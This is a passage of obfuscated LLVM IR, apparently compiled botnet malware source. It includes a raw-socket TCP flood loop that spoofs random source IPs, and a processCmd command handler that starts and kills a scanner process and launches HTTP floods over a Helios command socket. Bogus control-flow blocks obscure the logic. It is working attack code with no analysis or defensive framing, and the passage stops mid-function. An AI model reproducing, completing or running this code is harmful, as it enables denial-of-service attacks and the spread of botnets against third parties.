  %444 = call zeroext i16 @csum(i16* %439, i32 %443)
  %445 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 7
  store i16 %444, i16* %446, align 2
  %447 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %448 = load i32, i32* %10, align 4
  %449 = add nsw i32 %447, %448
  store i32 %449, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %450

; <label>:450:                                    ; preds = %originalBBpart2116, %502, %425
  br label %451

; <label>:451:                                    ; preds = %450
  %452 = load i32, i32* %17, align 4
  %453 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %454 = call i64 @sendto(i32 %452, i8* %145, i64 %143, i32 0, %struct.sockaddr* %453, i32 16)
  %455 = load i32, i32* %19, align 4
  %456 = call i32 @GetRandomIP(i32 %455)
  %457 = call i32 @htonl(i32 %456) #13
  %458 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 8
  store i32 %457, i32* %459, align 4
  %460 = call i32 @rand_cmwc()
  %461 = trunc i32 %460 to i16
  %462 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 3
  store i16 %461, i16* %463, align 4
  %464 = call i32 @rand_cmwc()
  %465 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 0
  %467 = bitcast %union.anon.0* %466 to %struct.anon.1*
  %468 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %467, i32 0, i32 2
  store i32 %464, i32* %468, align 4
  %469 = call i32 @rand_cmwc()
  %470 = trunc i32 %469 to i16
  %471 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %472 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %471, i32 0, i32 0
  %473 = bitcast %union.anon.0* %472 to %struct.anon.1*
  %474 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %473, i32 0, i32 0
  store i16 %470, i16* %474, align 4
  %475 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %476 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %475, i32 0, i32 0
  %477 = bitcast %union.anon.0* %476 to %struct.anon.1*
  %478 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %477, i32 0, i32 6
  store i16 0, i16* %478, align 4
  %479 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %480 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %481 = call zeroext i16 @tcpcsum(%struct.iphdr* %479, %struct.tcphdr* %480)
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon.0* %483 to %struct.anon.1*
  %485 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %484, i32 0, i32 6
  store i16 %481, i16* %485, align 4
  %486 = bitcast i8* %145 to i16*
  %487 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 2
  %489 = load i16, i16* %488, align 2
  %490 = zext i16 %489 to i32
  %491 = call zeroext i16 @csum(i16* %486, i32 %490)
  %492 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 %491, i16* %493, align 2
  %494 = load i32, i32* %25, align 4
  %495 = load i32, i32* %15, align 4
  %496 = icmp eq i32 %494, %495
  br i1 %496, label %497, label %503

; <label>:497:                                    ; preds = %451
  %498 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %499 = load i32, i32* %24, align 4
  %500 = icmp sgt i32 %498, %499
  br i1 %500, label %501, label %502

; <label>:501:                                    ; preds = %497
  br label %522

; <label>:502:                                    ; preds = %497
  store i32 0, i32* %25, align 4
  br label %450

; <label>:503:                                    ; preds = %451
  %504 = load i32, i32* @x.87
  %505 = load i32, i32* @y.88
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %503
  %512 = load i32, i32* %25, align 4
  %513 = add i32 %512, 1
  store i32 %513, i32* %25, align 4
  %514 = load i32, i32* @x.87
  %515 = load i32, i32* @y.88
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart2116, label %originalBB108alteredBB

originalBBpart2116:                               ; preds = %originalBB108
  br label %450

; <label>:522:                                    ; preds = %501
  %523 = load i32, i32* @x.87
  %524 = load i32, i32* @y.88
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %522
  %531 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %531)
  %532 = load i32, i32* @x.87
  %533 = load i32, i32* @y.88
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %540

; <label>:540:                                    ; preds = %originalBBpart2120, %105, %83, %76
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %541 = load i32, i32* %9, align 4
  %542 = trunc i32 %541 to i16
  %543 = call zeroext i16 @htons(i16 zeroext %542) #13
  %544 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %543, i16* %544, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %545 = load i8*, i8** %8, align 8
  %546 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %547 = call i32 @getHost(i8* %545, %struct.in_addr* %546)
  %548 = icmp ne i32 %547, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  store i32 1, i32* %18, align 4
  %549 = load i32, i32* %17, align 4
  %550 = bitcast i32* %18 to i8*
  %551 = call i32 @setsockopt(i32 %549, i32 0, i32 3, i8* %550, i32 4) #2
  %552 = icmp slt i32 %551, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  store i32 0, i32* %19, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %553 = load i32, i32* %13, align 4
  %554 = sext i32 %553 to i64
  %_ = shl i64 40, %554
  %_15 = shl i64 40, %554
  %_16 = sub i64 40, %554
  %gen = mul i64 %_16, %554
  %_17 = sub i64 0, 40
  %gen18 = add i64 %_17, %554
  %_19 = sub i64 0, 40
  %gen20 = add i64 %_19, %554
  %_21 = sub i64 40, %554
  %gen22 = mul i64 %_21, %554
  %555 = add i64 40, %554
  %556 = call i8* @llvm.stacksave()
  store i8* %556, i8** %20, align 8
  %557 = alloca i8, i64 %555, align 16
  %558 = bitcast i8* %557 to %struct.iphdr*
  store %struct.iphdr* %558, %struct.iphdr** %21, align 8
  %559 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %560 = bitcast %struct.iphdr* %559 to i8*
  %561 = getelementptr i8, i8* %560, i64 20
  %562 = bitcast i8* %561 to %struct.tcphdr*
  store %struct.tcphdr* %562, %struct.tcphdr** %22, align 8
  %563 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %565 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 4
  %567 = load i32, i32* %19, align 4
  %568 = call i32 @GetRandomIP(i32 %567)
  %569 = call i32 @htonl(i32 %568) #13
  %570 = load i32, i32* %13, align 4
  %571 = sext i32 %570 to i64
  %_23 = shl i64 20, %571
  %_24 = shl i64 20, %571
  %_25 = shl i64 20, %571
  %_26 = shl i64 20, %571
  %_27 = sub i64 0, 20
  %gen28 = add i64 %_27, %571
  %572 = add i64 20, %571
  %573 = trunc i64 %572 to i32
  call void @makeIPPacket(%struct.iphdr* %563, i32 %566, i32 %569, i8 zeroext 6, i32 %573)
  %574 = call i32 @rand_cmwc()
  %575 = trunc i32 %574 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 0
  %578 = bitcast %union.anon.0* %577 to %struct.anon.1*
  %579 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %578, i32 0, i32 0
  store i16 %575, i16* %579, align 4
  %580 = call i32 @rand_cmwc()
  %581 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 0
  %583 = bitcast %union.anon.0* %582 to %struct.anon.1*
  %584 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %583, i32 0, i32 2
  store i32 %580, i32* %584, align 4
  %585 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 0
  %587 = bitcast %union.anon.0* %586 to %struct.anon.1*
  %588 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %587, i32 0, i32 3
  store i32 0, i32* %588, align 4
  %589 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 0
  %591 = bitcast %union.anon.0* %590 to %struct.anon.1*
  %592 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %591, i32 0, i32 4
  %593 = load i16, i16* %592, align 4
  %_29 = sub i16 %593, -241
  %gen30 = mul i16 %_29, -241
  %_31 = sub i16 0, %593
  %gen32 = add i16 %_31, -241
  %_33 = shl i16 %593, -241
  %_34 = sub i16 %593, -241
  %gen35 = mul i16 %_34, -241
  %_36 = sub i16 %593, -241
  %gen37 = mul i16 %_36, -241
  %_38 = sub i16 %593, -241
  %gen39 = mul i16 %_38, -241
  %_40 = sub i16 %593, -241
  %gen41 = mul i16 %_40, -241
  %594 = and i16 %593, -241
  %_42 = sub i16 0, %594
  %gen43 = add i16 %_42, 80
  %_44 = sub i16 0, %594
  %gen45 = add i16 %_44, 80
  %_46 = sub i16 %594, 80
  %gen47 = mul i16 %_46, 80
  %595 = or i16 %594, 80
  store i16 %595, i16* %592, align 4
  %596 = load i8*, i8** %12, align 8
  %597 = call i32 @strcmp(i8* %596, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.388, i32 0, i32 0)) #10
  %598 = icmp ne i32 %597, 0
  br label %originalBB14

originalBB51alteredBB:                            ; preds = %originalBB51, %231
  %599 = load i8*, i8** %12, align 8
  %600 = call i8* @strtok(i8* %599, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %600, i8** %23, align 8
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %269
  %601 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 0
  %603 = bitcast %union.anon.0* %602 to %struct.anon.1*
  %604 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %603, i32 0, i32 4
  %605 = load i16, i16* %604, align 4
  %_56 = sub i16 %605, -1025
  %gen57 = mul i16 %_56, -1025
  %_58 = sub i16 0, %605
  %gen59 = add i16 %_58, -1025
  %_60 = sub i16 0, %605
  %gen61 = add i16 %_60, -1025
  %606 = and i16 %605, -1025
  %_62 = shl i16 %606, 1024
  %_63 = shl i16 %606, 1024
  %_64 = sub i16 0, %606
  %gen65 = add i16 %_64, 1024
  %_66 = sub i16 %606, 1024
  %gen67 = mul i16 %_66, 1024
  %_68 = shl i16 %606, 1024
  %_69 = shl i16 %606, 1024
  %_70 = shl i16 %606, 1024
  %_71 = shl i16 %606, 1024
  %607 = or i16 %606, 1024
  store i16 %607, i16* %604, align 4
  br label %originalBB55

originalBB75alteredBB:                            ; preds = %originalBB75, %293
  %608 = load i8*, i8** %23, align 8
  %609 = call i32 @strcmp(i8* %608, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.392, i32 0, i32 0)) #10
  %610 = icmp ne i32 %609, 0
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %325
  %611 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 0
  %613 = bitcast %union.anon.0* %612 to %struct.anon.1*
  %614 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %613, i32 0, i32 4
  %615 = load i16, i16* %614, align 4
  %_80 = sub i16 %615, -4097
  %gen81 = mul i16 %_80, -4097
  %_82 = shl i16 %615, -4097
  %_83 = sub i16 %615, -4097
  %gen84 = mul i16 %_83, -4097
  %616 = and i16 %615, -4097
  %_85 = shl i16 %616, 4096
  %_86 = sub i16 %616, 4096
  %gen87 = mul i16 %_86, 4096
  %_88 = sub i16 %616, 4096
  %gen89 = mul i16 %_88, 4096
  %_90 = shl i16 %616, 4096
  %_91 = sub i16 %616, 4096
  %gen92 = mul i16 %_91, 4096
  %_93 = sub i16 %616, 4096
  %gen94 = mul i16 %_93, 4096
  %_95 = shl i16 %616, 4096
  %_96 = shl i16 %616, 4096
  %617 = or i16 %616, 4096
  store i16 %617, i16* %614, align 4
  br label %originalBB79

originalBB100alteredBB:                           ; preds = %originalBB100, %361
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %384
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %503
  %618 = load i32, i32* %25, align 4
  %_109 = sub i32 0, %618
  %gen110 = add i32 %_109, 1
  %_111 = sub i32 0, %618
  %gen112 = add i32 %_111, 1
  %_113 = shl i32 %618, 1
  %_114 = shl i32 %618, 1
  %619 = add i32 %618, 1
  store i32 %619, i32* %25, align 4
  br label %originalBB108

originalBB118alteredBB:                           ; preds = %originalBB118, %522
  %620 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %620)
  br label %originalBB118
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

; <label>:36:                                     ; preds = %2
  br label %1001

; <label>:37:                                     ; preds = %2
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.396, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %129, label %43

; <label>:43:                                     ; preds = %37
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.397, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %56, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i32, i32* @scanPid, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49
  br label %1001

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @scanPid, align 4
  %55 = call i32 @kill(i32 %54, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %56

; <label>:56:                                     ; preds = %53, %43
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.398, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %112, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* @x.89
  %64 = load i32, i32* @y.90
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %62
  %71 = load i32, i32* @scanPid, align 4
  %72 = icmp ne i32 %71, 0
  %73 = load i32, i32* @x.89
  %74 = load i32, i32* @y.90
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %72, label %81, label %82

; <label>:81:                                     ; preds = %originalBBpart2
  br label %1001

; <label>:82:                                     ; preds = %originalBBpart2
  %83 = call i32 @fork() #2
  store i32 %83, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %84 = load i32, i32* %5, align 4
  %85 = icmp ugt i32 %84, 0
  br i1 %85, label %86, label %88

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* %5, align 4
  store i32 %87, i32* @scanPid, align 4
  br label %1001

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* @x.89
  %90 = load i32, i32* @y.90
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = load i32, i32* %5, align 4
  %98 = icmp eq i32 %97, -1
  %99 = load i32, i32* @x.89
  %100 = load i32, i32* @y.90
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %107, label %108

; <label>:107:                                    ; preds = %originalBBpart24
  br label %1001

; <label>:108:                                    ; preds = %originalBBpart24
  br label %109

; <label>:109:                                    ; preds = %108
  %110 = load i32, i32* %7, align 4
  %111 = load i32, i32* %6, align 4
  call void @StartTheLelz(i32 %110, i32 %111)
  call void @_exit(i32 0) #12
  unreachable

; <label>:112:                                    ; preds = %56
  %113 = load i32, i32* @x.89
  %114 = load i32, i32* @y.90
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %112
  %121 = load i32, i32* @x.89
  %122 = load i32, i32* @y.90
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %129

; <label>:129:                                    ; preds = %originalBBpart28, %37
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 0
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @strcmp(i8* %132, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.399, i32 0, i32 0)) #10
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %242, label %135

; <label>:135:                                    ; preds = %129
  %136 = load i32, i32* %3, align 4
  %137 = icmp slt i32 %136, 6
  br i1 %137, label %182, label %138

; <label>:138:                                    ; preds = %135
  %139 = load i32, i32* @x.89
  %140 = load i32, i32* @y.90
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 3
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #10
  %151 = icmp slt i32 %150, 1
  %152 = load i32, i32* @x.89
  %153 = load i32, i32* @y.90
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %151, label %182, label %160

; <label>:160:                                    ; preds = %originalBBpart212
  %161 = load i32, i32* @x.89
  %162 = load i32, i32* @y.90
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = load i8**, i8*** %4, align 8
  %170 = getelementptr inbounds i8*, i8** %169, i64 5
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 @atoi(i8* %171) #10
  %173 = icmp slt i32 %172, 1
  %174 = load i32, i32* @x.89
  %175 = load i32, i32* @y.90
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %173, label %182, label %199

; <label>:182:                                    ; preds = %originalBBpart216, %originalBBpart212, %135
  %183 = load i32, i32* @x.89
  %184 = load i32, i32* @y.90
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %182
  %191 = load i32, i32* @x.89
  %192 = load i32, i32* @y.90
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1001

; <label>:199:                                    ; preds = %originalBBpart216
  %200 = call i32 @listFork()
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %199
  br label %1001

; <label>:203:                                    ; preds = %199
  %204 = load i32, i32* @HeliosCommSock, align 4
  %205 = load i8**, i8*** %4, align 8
  %206 = getelementptr inbounds i8*, i8** %205, i64 1
  %207 = load i8*, i8** %206, align 8
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 3
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 5
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  %219 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %204, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.400, i32 0, i32 0), i8* %207, i8* %210, i32 %214, i32 %218)
  %220 = load i8**, i8*** %4, align 8
  %221 = getelementptr inbounds i8*, i8** %220, i64 1
  %222 = load i8*, i8** %221, align 8
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 2
  %225 = load i8*, i8** %224, align 8
  %226 = load i8**, i8*** %4, align 8
  %227 = getelementptr inbounds i8*, i8** %226, i64 3
  %228 = load i8*, i8** %227, align 8
  %229 = call i32 @atoi(i8* %228) #10
  %230 = trunc i32 %229 to i16
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 4
  %233 = load i8*, i8** %232, align 8
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 5
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @atoi(i8* %236) #10
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 6
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  call void @sendHTTP(i8* %222, i8* %225, i16 zeroext %230, i8* %233, i32 %237, i32 %241)
  call void @exit(i32 0) #14
  unreachable

; <label>:242:                                    ; preds = %129
  %243 = load i8**, i8*** %4, align 8
  %244 = getelementptr inbounds i8*, i8** %243, i64 0
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 @strcmp(i8* %245, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.401, i32 0, i32 0)) #10
  %247 = icmp ne i32 %246, 0
  br i1 %247, label %535, label %248

; <label>:248:                                    ; preds = %242
  %249 = load i32, i32* %3, align 4
  %250 = icmp slt i32 %249, 6
  br i1 %250, label %334, label %251

; <label>:251:                                    ; preds = %248
  %252 = load i32, i32* @x.89
  %253 = load i32, i32* @y.90
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %251
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 3
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp eq i32 %263, -1
  %265 = load i32, i32* @x.89
  %266 = load i32, i32* @y.90
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %264, label %334, label %273

; <label>:273:                                    ; preds = %originalBBpart224
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 2
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %334, label %279

; <label>:279:                                    ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  %284 = icmp eq i32 %283, -1
  br i1 %284, label %334, label %285

; <label>:285:                                    ; preds = %279
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 5
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #10
  %290 = icmp eq i32 %289, -1
  br i1 %290, label %334, label %291

; <label>:291:                                    ; preds = %285
